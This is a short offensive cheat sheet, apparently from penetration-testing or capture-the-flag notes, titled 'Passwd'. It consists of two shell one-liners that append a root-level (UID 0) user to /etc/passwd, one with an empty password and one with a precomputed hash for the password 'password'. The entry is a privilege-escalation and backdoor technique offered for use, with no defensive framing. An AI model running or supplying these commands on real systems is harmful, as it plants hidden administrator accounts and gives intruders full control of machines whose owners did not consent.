# Passwd

## /etc/passwd make a new user with no password

`echo "hack::0:0:,,,:/root:/bin/sh" >> /etc/passwd`



Add a user with password as password

```text
echo "hacked:$1$oEEgii4t$lCiEbtmrRtb9RrwaeGwbu0:0:0:,,,:/root:/bin/sh" >> /etc/passwd
```

